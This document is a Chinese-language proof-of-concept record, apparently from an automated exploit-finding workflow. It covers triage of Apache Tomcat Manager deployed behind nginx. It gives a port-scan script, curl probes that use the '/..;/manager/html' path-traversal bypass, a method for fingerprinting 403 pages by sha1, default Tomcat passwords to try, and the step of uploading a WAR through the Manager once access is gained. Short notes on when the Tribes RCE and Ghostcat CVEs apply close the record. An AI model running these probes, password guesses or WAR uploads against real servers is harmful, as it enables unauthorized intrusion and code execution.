# Tomcat Manager 快速判死：403 页字节级指纹（同版本 stock 页跨机器 sha1 完全一致）+ 端口面普查（只暴露 nginx ⇒ 头伪造必然无效，Tribes/8009 一并判死）

- **code**: tomcat-manager-快速判死-403-页字节级指纹-同版本-stock-页跨机器-sha1-完全一致-端口面普查-只暴露-nginx-头伪造必然无效
- **kind**: poc
- **category**: recon
- **component**: Apache Tomcat Manager（RemoteAddrValve / host-manager）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.12 与 203.0.113.56/.60/.61/.62 共 5 台上实测：所有 `/X/..;/manager/html` 一律 403 且**同版本 403 页跨机器 sha1 完全一致**（9.0.x = 3446B / d3c0419bc10a…，8.5.81 = 3529B / 96d79ba62751…）；16 台机器 × 17 端口的 TCP 普查显示 8080/8443/8009/4000 全部关闭；33 种来源 IP 头 + 路径变体 + Host 变体在 .72 上全部 403。证据：work/exploit4/s20_58mgr.txt、s22_ports.json、s10_manager.txt；攻击链 seq 37/42。
- **path**: pocs/tomcat-manager-快速判死-403-页字节级指纹-同版本-stock-页跨机器-sha1-完全一致-端口面普查-只暴露-nginx-头伪造必然无效/poc.sh
- **tags**: tomcat,manager,RemoteAddrValve,负结论,stock403指纹,端口面,CVE-2026-34486,Ghostcat,头伪造无效
- **created_at**: 2026-10-11T10:36:28.395Z
- **found_by**: exploit

## 描述

Manager 在"只暴露 nginx 的集群"上的快速判死法：用 403 页长度+sha1 做字节级指纹比对（同版本 stock 页跨机器完全一致），配合端口面普查（无 8080/8443/8009/4000 ⇒ 头伪造必然无效）一步定论；附 Tribes RCE 与 Ghostcat 的无端口判死。

## 用法

```
遇到"nginx 前置 + Tomcat 后置"的集群：① 先扫 8009/8080/8081/8082/8443/4000，全关就基本可以放弃 Manager 与 AJP/Tribes 路线；② 用 `--path-as-is` 打 `/前缀/..;/manager/html`，比较 403 页长度与 sha1 与已知 stock 页是否一致（一致 = 阀配置与已知机器相同，不值得逐个试）；③ 只有出现 401（Basic realm="Tomcat Manager Application"）才值得试口令，出现 200 就直接 `/manager/html` 取 `CSRF_NONCE` 走 `/manager/html/upload` 传 WAR。
```

## 正文

```
## 结论（一条即可判死）
**只要目标只暴露 nginx（80/443），且 nginx 与 Tomcat 不在同一台/不是 127 出口，Manager 就永远进不去。** 原因：`RemoteAddrValve` 只看 **TCP 对端地址**，而对端永远是 nginx；**纯 HTTP 头伪造（含 RemoteIpValve 相关头）在阀门未启用 RemoteIpValve 时一律无效**。

## 判死流程（30 秒，不用试 33 遍）
```bash
# 1) 端口面：Tomcat 直连端口是否暴露（决定"对端是否可被我们控制"）
python - <<'PY'
import socket
for p in (8009,8080,8081,8082,8443,4000,1099,8005,8000):
    s=socket.socket(); s.settimeout(2)
    try: s.connect(("TARGET",p)); print(p,"OPEN")
    except Exception: pass
    finally: s.close()
PY
# 2) Manager 是否被代理进来（直连 = nginx 404 ⇒ 只走跨 context）
curl -sk --noproxy '*' --path-as-is -o /dev/null -w "%{http_code}\n" "https://TARGET/manager/html"
# 3) 跨 context 归一化（拿得到页面 = 阀在，拿不到 = nginx 没代理）
curl -sk --noproxy '*' --path-as-is -D - -o /tmp/o "https://TARGET/LHService/..;/manager/html" | head -1
wc -c /tmp/o
```
**判定规则**：
- **403 + Tomcat stock 页** ⇒ 阀在且把我们挡了（页长是"指纹"：9.0.x 常见 **3446B**，8.5.x 常见 **3529B**；**同版本的 403 页在不同机器上字节完全相同**，用 sha1 一比就知道"阀配置是否一致"）。
- **404** ⇒ 该前缀没被 nginx 代理，或该实例没部署 manager。
- **401（`WWW-Authenticate: Basic realm="Tomcat Manager Application"`）** ⇒ 阀放行、只是要口令 ⇒ 这才值得少量试口令（tomcat/tomcat、tomcat/s3cret、admin/admin…）。
- **200** ⇒ 直接进，用 `/manager/html` 里的 `CSRF_NONCE` 走 `/manager/html/upload` 上传 WAR。

## 实测数据（本靶标，可作"字节级判据"参考）
| 目标 | 入口 | 结果 |
|---|---|---|
| 203.0.113.12 / .59~.62（5 台） | `/LHService/..;/manager/html`（与 `/Tk_Kj`、`/IMService`、`/UpLoadPic` 同款） | **403 / 3446B / sha1(d3c0419bc10a…) 五台完全一致** ⇒ 9.0.x stock 页，阀配置相同 |
| 同上 | `/PayBmob/..;/manager/html`（落到 8.5.81 那台） | **403 / 3529B / sha1(96d79ba62751…) 一致** |
| 同上 | `/manager/html`、`/host-manager/html`、`/manager/status` | nginx **404**（未代理） |
| `203.0.113.78~70` 共 16 台 | 8080/8081/8082/8443/8009/4000/1099/8005/8000/3306/9000/8888/5005 | **全部关闭**（只有 22/80/443） |

## 顺带判死的兄弟 CVE（无端口 = 无洞）
- **CVE-2026-34486**（Tomcat Tribes EncryptInterceptor 绕过 RCE，影响 **11.0.20 / 10.1.53 / 9.0.116**）：需要 **Tribes 集群端口 4000**。端口不存在 ⇒ 不适用；且目标版本 9.0.122/8.5.78/8.5.81 也不在影响列表。
- **CVE-2020-1938 Ghostcat**：需要 8009 AJP。端口关闭；即便"经代理 CONNECT 返回 200"，**CPing 必须收到 `AB` 开头的应答**才算有 AJP（recv 0 字节 = 代理盲回，是假象）。
```
